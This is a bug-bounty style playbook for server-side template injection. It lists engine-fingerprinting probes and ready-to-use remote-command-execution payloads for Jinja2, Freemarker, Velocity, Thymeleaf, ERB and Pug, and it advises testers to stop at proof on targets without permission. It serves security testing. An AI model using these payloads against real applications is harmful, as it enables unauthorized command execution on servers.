# Server-Side Template Injection (SSTI) — playbook

## when to try
- Email-template features ("hello {name}", custom signatures, marketing emails).
- Report generators (PDF/HTML), invoice templates, label printing.
- Error pages that echo user input through a template engine.
- "Custom domain" / "white-label" features where strings render server-side.

## detect engine
Send `${7*7}` / `{{7*7}}` / `<%= 7*7 %>` / `#{7*7}` / `*{7*7}` / `[[${7*7}]]` and observe.

| Engine | Marker | Lang |
|---|---|---|
| Jinja2 / Twig | `{{7*7}}` → `49` | Python / PHP |
| Mako | `${7*7}` → `49` | Python |
| Smarty | `{$smarty.version}` echoes | PHP |
| Velocity | `#set($x=7*7)$x` → `49` | Java |
| Freemarker | `${7*7}` → `49` (different sandbox) | Java |
| Thymeleaf | `[[${7*7}]]` → `49`, esp. `__${...}__::.x` for SpEL | Java |
| ERB | `<%= 7*7 %>` → `49` | Ruby |
| Handlebars | `{{7*7}}` (helpers only — limited unless registerHelper) | JS |
| Pug/Jade | `#{7*7}` → `49` | JS |
| Razor | `@(7*7)` → `49` | C# |

Disambiguate Jinja vs Twig: `{{7*'7'}}` → Jinja: `7777777`, Twig: `49`.

## escalation per engine
- **Jinja2** → RCE:
  ```
  {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
  ```
  Or shorter:
  ```
  {{ ''.__class__.__mro__[1].__subclasses__()[<idx>]("id",shell=True,stdout=-1).communicate() }}
  ```
- **Freemarker** → RCE: `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}`.
- **Velocity** → RCE: `#set($e="exp"+"r")${"".getClass().forName("java.lang.Runtime").getMethod("exec",[Ljava.lang.String;).invoke(...)}`.
- **Thymeleaf** SpEL: `*{T(java.lang.Runtime).getRuntime().exec('id')}`.
- **ERB** → RCE: `<%= `id` %>` literally is shell.
- **Pug** → RCE: `#{root.process.mainModule.require('child_process').execSync('id').toString()}`.

## confirmation flow
1. Inject the marker. If math evaluates → SSTI confirmed.
2. Fingerprint the engine.
3. **Stop** at "I can compute" on real targets unless you control a sandboxed test account. Don't run commands on the production box without explicit permission.

## caveats
- Many "template engines" are sandboxed — math works, RCE blocked. Still report — sandbox bypasses for major engines come out yearly.
- Don't confuse with CSTI (client-side) — different bug class entirely.

## provenance
PortSwigger SSTI labs. Tplmap. James Kettle's "Server-Side Template Injection" 2015.
